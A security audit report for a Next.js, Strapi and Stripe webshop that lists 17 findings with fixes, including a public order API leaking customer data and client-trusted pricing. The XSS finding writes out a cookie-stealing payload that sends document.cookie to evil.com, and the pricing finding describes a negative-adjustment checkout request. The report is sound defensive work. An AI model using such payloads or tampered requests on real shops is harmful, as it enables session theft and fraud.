# 🔒 Security Audit Report — CustomStore Webshop

**Date:** 2026-05-04  
**Auditor:** Security Review  
**Scope:** Full codebase — `frontend/` (Next.js) + `backend/` (Strapi + Stripe)

---

## Executive Summary

This audit identified **4 critical**, **4 high**, **5 medium**, and **4 low** severity issues. The most urgent problems are a **public order API that leaks all customer PII**, an **XSS vulnerability**, **price manipulation due to client-side trust**, and **missing CORS configuration for production**. These must be fixed before going live.

---

## 🔴 CRITICAL — Fix Immediately

### 1. Order API Exposes All Customer Data Without Authentication

> [!CAUTION]
> **Anyone on the internet can read every order** — emails, names, shipping addresses, Stripe session IDs, and order contents — without any authentication.

**File:** [order.ts](file:///Users/sanid/Documents/store/backend/src/api/order/routes/order.ts)

```typescript
// CURRENT — Both endpoints are public
export default factories.createCoreRouter('api::order.order', {
  config: {
    find: { auth: false },     // ← anyone can list ALL orders
    findOne: { auth: false },  // ← anyone can read ANY order
  },
  only: ['find', 'findOne'],
});
```

**What leaks:** `customerEmail`, `customerName`, `shippingAddress` (full postal address), `stripeSessionId`, `items` (with customizations), `totalAmount`.

**Impact:** Full GDPR violation. Attackers can scrape your entire customer database via `GET /api/orders`.

**Fix:** Remove public access entirely. Orders should only be readable by authenticated admin users:

```typescript
export default factories.createCoreRouter('api::order.order', {
  only: ['find', 'findOne'],
  // Remove config entirely — defaults to requiring authentication
});
```

---

### 2. XSS (Cross-Site Scripting) via Product Description

> [!CAUTION]
> Product descriptions are rendered as raw HTML using `dangerouslySetInnerHTML` without sanitization. If a CMS admin (or attacker who compromises the CMS) injects `<script>` tags, they execute in every customer's browser.

**File:** [ProductCustomizer.tsx](file:///Users/sanid/Documents/store/frontend/src/components/ProductCustomizer.tsx#L177-L180)

```tsx
<div
  className="prose prose-sm max-w-none text-muted"
  dangerouslySetInnerHTML={{ __html: product.description }}  // ← unsanitized
/>
```

**Attack scenario:** CMS admin adds `<img src=x onerror="fetch('https://evil.com/steal?c='+document.cookie)">` to a product description → every visitor's session is hijacked.

**Fix:** Install and use [DOMPurify](https://github.com/cure53/DOMPurify):

```bash
npm install dompurify isomorphic-dompurify
```

```tsx
import DOMPurify from 'isomorphic-dompurify';

<div
  className="prose prose-sm max-w-none text-muted"
  dangerouslySetInnerHTML={{ __html: DOMPurify.sanitize(product.description) }}
/>
```

---

### 3. Price Manipulation — Server Trusts Client-Provided Prices

> [!CAUTION]
> The checkout endpoint accepts `customizationPriceAdjustment` from the client and adds it directly to the price. An attacker can send a **negative** adjustment to get products for free or near-free.

**File:** [order.ts](file:///Users/sanid/Documents/store/backend/src/api/order/controllers/order.ts#L36-L39)

```typescript
let unitAmount = product.price;
if (item.customizationPriceAdjustment) {
  unitAmount += item.customizationPriceAdjustment;  // ← attacker sends -9999
}
```

**Attack:** `curl -X POST /api/orders/checkout` with `customizationPriceAdjustment: -4999` on a $50 product → charges $0.01 to Stripe.

**Fix:** **Never trust client prices.** Recalculate the adjustment server-side from the product's `customizationSchema`:

```typescript
// Server-side recalculation
function calculatePriceAdjustment(schema: any, customization: Record<string, any>): number {
  if (!schema?.fields) return 0;
  let adjustment = 0;
  for (const field of schema.fields) {
    if (field.priceModifier && customization[field.id]) {
      const key = String(customization[field.id]);
      const mod = field.priceModifier[key];
      if (typeof mod === 'number' && mod > 0) {  // only allow positive adjustments
        adjustment += mod;
      }
    }
  }
  return adjustment;
}

// In createCheckoutSession:
const serverAdjustment = calculatePriceAdjustment(
  product.customizationSchema,
  item.customization
);
let unitAmount = product.price + serverAdjustment;
```

---

### 4. CORS Not Configured for Production

> [!CAUTION]
> CORS only allows `localhost` origins. In production, no frontend domain is whitelisted, meaning either CORS will block your real frontend, or you'll be tempted to set `origin: '*'`, which opens the API to any website.

**File:** [middlewares.ts](file:///Users/sanid/Documents/store/backend/config/middlewares.ts#L12)

```typescript
origins: ['http://localhost:3000', 'http://localhost:3001'],  // ← no production domain
```

**Fix:** Use an environment variable:

```typescript
origins: (process.env.CORS_ORIGINS || 'http://localhost:3000')
  .split(',')
  .map(s => s.trim()),
```

---

## 🟠 HIGH — Fix Before Launch

### 5. No Rate Limiting on Checkout Endpoint

**File:** [checkout.ts](file:///Users/sanid/Documents/store/backend/src/api/order/routes/checkout.ts)

The `/orders/checkout` endpoint has `auth: false` and no rate limiting. An attacker can:
- Spam Stripe API calls (you pay per API call)
- Create thousands of pending orders, polluting your database
- Attempt card testing attacks through your checkout

**Fix:** Add rate limiting via Strapi middleware or a reverse proxy (nginx, Cloudflare). At minimum, add IP-based throttling.

---

### 6. Stripe Webhook Raw Body Parsing Issue

**File:** [order.ts](file:///Users/sanid/Documents/store/backend/src/api/order/controllers/order.ts#L150-L155)

```typescript
const event = stripeInstance.webhooks.constructEvent(
  ctx.request.body,   // ← Strapi parses this as JSON, not raw buffer
  sig,
  webhookSecret
);
```

Stripe webhook signature verification requires the **raw request body** (Buffer/string). Strapi's body parser will parse it as JSON, making `ctx.request.body` an object — signature verification will **always fail** in production.

**Fix:** Configure the webhook route to receive the raw body. You need a custom Strapi middleware that preserves `ctx.request.rawBody` for this route, or use `ctx.request.rawBody` if available in your Strapi version:

```typescript
const event = stripeInstance.webhooks.constructEvent(
  ctx.request.body[Symbol.for('unparsedBody')] || ctx.request.rawBody,
  sig,
  webhookSecret
);
```

---

### 7. No Inventory Validation at Checkout

**File:** [order.ts](file:///Users/sanid/Documents/store/backend/src/api/order/controllers/order.ts#L26-L34)

The server checks if the product exists but never checks `product.inventory`. A customer can order 1000 units of a product with 0 inventory.

**Fix:**

```typescript
if (product.inventory !== null && product.inventory < (item.quantity || 1)) {
  return ctx.badRequest(`"${product.name}" is out of stock or insufficient inventory`);
}
```

Also: decrement inventory after successful payment (in the webhook handler), not at checkout creation.

---

### 8. No Quantity Validation — Negative/Extreme Quantities

**File:** [order.ts](file:///Users/sanid/Documents/store/backend/src/api/order/controllers/order.ts#L78)

```typescript
quantity: item.quantity || 1,  // ← no upper bound, no negative check
```

An attacker can send `quantity: -5` or `quantity: 999999`.

**Fix:**

```typescript
const qty = Math.max(1, Math.min(Math.floor(item.quantity || 1), 99));
```

---

## 🟡 MEDIUM — Fix Soon

### 9. Internal Error Messages Leaked to Client

**File:** [order.ts](file:///Users/sanid/Documents/store/backend/src/api/order/controllers/order.ts#L131)

```typescript
ctx.internalServerError(err.message || 'Failed to create checkout session');
```

Stripe SDK error messages may contain internal details (API version, request IDs, partial keys). These should not reach the client.

**Fix:**

```typescript
strapi.log.error('Checkout session creation failed:', err);
ctx.internalServerError('Failed to create checkout session');
```

---

### 10. `STRIPE_WEBHOOK_SECRET` Not Set in `.env`

**File:** [.env](file:///Users/sanid/Documents/store/backend/.env)

The `.env` file has `STRIPE_SECRET_KEY` but no `STRIPE_WEBHOOK_SECRET`. Without this, the webhook handler will return 500 for every Stripe event, and orders will stay stuck in `pending` forever.

**Fix:** Add to `.env`:

```
STRIPE_WEBHOOK_SECRET=whsec_your_webhook_signing_secret
```

---

### 11. Hardcoded `localhost` Image URLs Sent to Stripe

**File:** [order.ts](file:///Users/sanid/Documents/store/backend/src/api/order/controllers/order.ts#L66-L68)

```typescript
const imageUrl = product.image.url.startsWith('http')
  ? product.image.url
  : `http://localhost:1337${product.image.url}`;  // ← breaks in production
```

In production, Stripe will receive `localhost` URLs which are unreachable.

**Fix:**

```typescript
const BACKEND_URL = process.env.BACKEND_PUBLIC_URL || 'http://localhost:1337';
const imageUrl = product.image.url.startsWith('http')
  ? product.image.url
  : `${BACKEND_URL}${product.image.url}`;
```

---

### 12. Frontend Strapi API URL Exposed via `NEXT_PUBLIC_` Prefix

**File:** [.env.local](file:///Users/sanid/Documents/store/frontend/.env.local)

```
NEXT_PUBLIC_STRAPI_URL=http://localhost:1337
```

With `NEXT_PUBLIC_` prefix, this URL is embedded in the client-side JavaScript bundle. If this points to an internal/private Strapi instance in production, it leaks the internal network address. The frontend currently calls Strapi directly from the **client side** (in `createCheckoutSession`), which means users can also interact with Strapi endpoints directly.

**Fix:** Route API calls through Next.js API routes (server-side) instead of exposing the Strapi URL to the browser. Only server-side rendering calls should hit Strapi directly.

---

### 13. Missing Security Headers

The frontend lacks several production-critical headers:

- **Content-Security-Policy** — prevents XSS, data exfiltration
- **Strict-Transport-Security** — forces HTTPS
- **X-Content-Type-Options** — prevents MIME sniffing
- **Referrer-Policy** — controls referrer leakage
- **Permissions-Policy** — restricts browser features

**Fix:** Add to `next.config.ts`:

```typescript
const nextConfig: NextConfig = {
  output: "standalone",
  headers: async () => [
    {
      source: '/(.*)',
      headers: [
        { key: 'X-Content-Type-Options', value: 'nosniff' },
        { key: 'X-Frame-Options', value: 'DENY' },
        { key: 'Referrer-Policy', value: 'strict-origin-when-cross-origin' },
        { key: 'Permissions-Policy', value: 'camera=(), microphone=(), geolocation=()' },
        { key: 'Strict-Transport-Security', value: 'max-age=63072000; includeSubDomains; preload' },
      ],
    },
  ],
  // ...rest
};
```

---

## 🟢 LOW — Improve Before Scaling

### 14. `dangerouslyAllowLocalIP` Left Enabled

**File:** [next.config.ts](file:///Users/sanid/Documents/store/frontend/next.config.ts#L26)

```typescript
dangerouslyAllowLocalIP: true,  // ← development-only setting
```

This allows SSRF (Server-Side Request Forgery) attacks via Next.js image optimization where an attacker could request internal network images.

**Fix:** Remove for production or gate it behind an env check:

```typescript
dangerouslyAllowLocalIP: process.env.NODE_ENV !== 'production',
```

---

### 15. Backend Dockerfile Runs as Root

**File:** [Dockerfile](file:///Users/sanid/Documents/store/backend/Dockerfile)

Unlike the frontend Dockerfile (which correctly uses a non-root `nextjs` user), the backend Dockerfile runs as `root`. If the container is compromised, the attacker has root privileges.

**Fix:**

```dockerfile
RUN addgroup -S strapi && adduser -S strapi -G strapi
USER strapi
```

---

### 16. `.env.example` Missing Production-Critical Variables

**File:** [.env.example](file:///Users/sanid/Documents/store/frontend/.env.example)

The frontend `.env.example` is missing `NEXT_PUBLIC_STRIPE_PUBLISHABLE_KEY` and `NEXT_PUBLIC_SITE_URL`. New developers won't know these are required.

**Fix:** Update both `.env.example` files to include all required variables with placeholder values.

---

### 17. SQLite in Production

**File:** [.env](file:///Users/sanid/Documents/store/backend/.env)

```
DATABASE_CLIENT=sqlite
DATABASE_FILENAME=.tmp/data.db
```

SQLite is not suitable for production workloads:
- No concurrent write support
- Data lost if container restarts (unless volume is mounted)
- No backups/replication

**Fix:** Switch to PostgreSQL for production.

---

## ✅ Things Done Right

| Area | Status |
|------|--------|
| `.env` files excluded from git | ✅ Good |
| `.env` files excluded from Docker builds | ✅ Good |
| Frontend Dockerfile uses non-root user | ✅ Good |
| Stripe webhook has signature verification | ✅ Good (but needs raw body fix) |
| Server-side product price lookup (base) | ✅ Good |
| No hardcoded secrets in source code | ✅ Good |
| API pagination limits set | ✅ Good |
| `robots.txt` blocks checkout/cart | ✅ Good |

---

## Priority Fix Order

| # | Issue | Severity | Effort |
|---|-------|----------|--------|
| 1 | Order API leaks all customer data | 🔴 Critical | 5 min |
| 2 | XSS via product description | 🔴 Critical | 15 min |
| 3 | Price manipulation | 🔴 Critical | 30 min |
| 4 | CORS production config | 🔴 Critical | 5 min |
| 5 | Rate limiting on checkout | 🟠 High | 30 min |
| 6 | Stripe webhook raw body | 🟠 High | 30 min |
| 7 | Inventory check at checkout | 🟠 High | 15 min |
| 8 | Quantity validation | 🟠 High | 5 min |
| 9 | Error message leakage | 🟡 Medium | 5 min |
| 10 | Webhook secret config | 🟡 Medium | 5 min |
| 11 | Localhost image URLs | 🟡 Medium | 10 min |
| 12 | Strapi URL exposure | 🟡 Medium | 1 hour |
| 13 | Security headers | 🟡 Medium | 15 min |
| 14 | `dangerouslyAllowLocalIP` | 🟢 Low | 2 min |
| 15 | Backend runs as root | 🟢 Low | 5 min |
| 16 | `.env.example` incomplete | 🟢 Low | 5 min |
| 17 | SQLite in production | 🟢 Low | 30 min |

> [!IMPORTANT]
> **Items 1–4 are blockers for production.** The order API leak alone is a GDPR liability, and the price manipulation can cause direct financial loss.
